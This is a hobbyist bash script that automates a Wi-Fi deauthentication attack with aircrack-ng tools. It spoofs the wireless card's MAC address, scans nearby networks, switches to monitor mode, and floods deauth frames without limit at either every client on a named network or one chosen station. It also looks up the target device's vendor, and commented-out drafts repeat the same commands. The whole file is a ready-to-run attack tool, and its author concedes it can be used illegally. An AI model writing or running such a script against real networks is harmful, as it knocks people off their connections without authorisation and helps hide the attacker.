#!/bin/bash

# made by EMLGaming and thanks for using it
# to run first type "chmod +x deauth.sh" then "./deauth.sh"
# then you are all good to go and this script is made for moose
# the script is not illigal but you can use it in a way that is illigal
# and moose you can thank me for this it took quite long xD


echo -e "\e[36mthis script is for da m00seman so we gotta go fast af boii"
sleep 1
clear
iwconfig
echo -e "\e[31mtype your wireless card name:\e[36m"
read wire
ifconfig $wire down
macchanger -r $wire
ifconfig $wire up
clear

echo "it is now scanning networks so this takes a little bit"
sleep 5
iw dev $wire scan | egrep "SSID|primary channel"
echo -e "\e[31mtype the name of the network:\e[36m"
read name
echo -e "\e[31mand the channel:\e[36m"
read channel
airmon-ng start $wire
airmon-ng check kill
clear	

echo -e "\e[31mwould you like to deauth:"
echo -e "1) all from the network"
echo -e "2) a specific target"
echo -e "type 1 or 2\e[36m"
read oneormore
if [[ $oneormore == 1 ]]; then
	
ifconfig $wire"mon" down
iwconfig $wire"mon" channel $channel
ifconfig $wire"mon" up



echo "now you are deauthing the network if you want to stop just close the window"
xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read" 

else 



gnome-terminal -x sh -c "airodump-ng --essid '$name' -c $channel $wire""mon" 
	echo " "
	echo -e "\e[31mwould you like to lookup a targets device?"
	echo -e "type yes or no\e[36m"
	read lookup
		if [[ $lookup == yes ]]; then 
			echo -e "\e[31mtype the first 6 characters of the station"
			echo -e "don't type the ':' do only xxxxxx\e[36m"
			read oui
			grep -i $oui /usr/share/nmap/nmap-mac-prefixes

		else
				echo " "
			fi		
		echo -e "\e[31mstation of the target"
		echo -e "but now make sure to type it like XX:00:XX:00:XX:00\e[36m"
		read station
		echo -e "when you are done just close the window"
		xterm -e "aireplay-ng -0 0 -e '$name' -c '$station' $wire""mon; read"

fi

echo -e "\e[31mpress enter to get wireless card out of monitor mode!\e[36m"
read 
airmon-ng stop $wire"mon"
clear
echo -e "DONE!!"
sleep 2
clear
# done!




























# just don't mind this this was all me trying to make it work and if it didn't i didn't wanna delete it



#gnome-terminal --hold -x sh -c "aireplay-ng -0 0 -e '$name' $wire""mon" 
#gnome-terminal -x sh -c "airodump-ng -c $channel --bssid $bssid $wire""mon" 


#echo "would you also like to deauth one taget? yes or no"
#read yesno
#if [[ $yesno == yes ]]; then 
#	echo "i'm gonna add a fuck ton of stuff here"
#	sleep 1
#else
#	echo "nice"
#fi



#entries=( "Deauth all on network"
#          "Deauth a target" )

#PS3='Selection: '
#
#
#while [ "$menu" != 1 ]; do              
#    printf "\nWould you like to deauth:\n\n"       
 #   select choic in "${entries[@]}"; do  
  #      case "$choic" in            
   #         "2" )
	#gnome-terminal -x sh -c "airodump-ng --essid '$name' $wire""mon" 
	#echo " "
	#echo "would you like to lookup a targets device?"
	#echo "type yes or no"
	#read lookup
#		if [[ $lookup == yes ]]; then 
#			echo "type the first 6 characters of the station"
#			echo "don't type the ':' do only xxxxxx"
#			read oui
#			grep -i $oui /usr/share/nmap/nmap-mac-prefixes
#				else
#				echo " "
#			fi
 #            #   break              
  #              ;;
   #         "1" )         
    #            
	#echo "now you are deauthing the network if you want to stop just close the window"
	#xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read" 
#
 #               menu=1                   
              #  break
  #              ;;
   #         * )
    #            echo "please type 1 or 2"
     #           break
      #          ;;
       # esac
   # done
#done





#echo "would you like to deauth:"
#echo "1) all from the network"
#echo "2) a specific target"
#echo "type 1 or 2"
#read oneormore
#if [[ $oneormore == 2 ]]; then
#	gnome-terminal -x sh -c "airodump-ng --essid '$name' $wire""mon" 
#	echo " "
#	echo "would you like to lookup a targets device?"
#	echo "type yes or no"
#	read lookup
#		if [[ $lookup == yes ]]; then 
#			echo "type the first 6 characters of the station"
#			echo "don't type the ':' do only xxxxxx"
#			read oui
#			grep -i $oui /usr/share/nmap/nmap-mac-prefixes
#				
#				else
#				echo " "
#		echo "station of the target"
#		read station
#		echo "when you are done just close the window"
#		xterm -e "aireplay-ng -0 0 -e 'name' -c 'station' $wire""mon; read"
#else
#echo "now you are deauthing the network if you want to stop just close the window"
#xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read" 
#fi
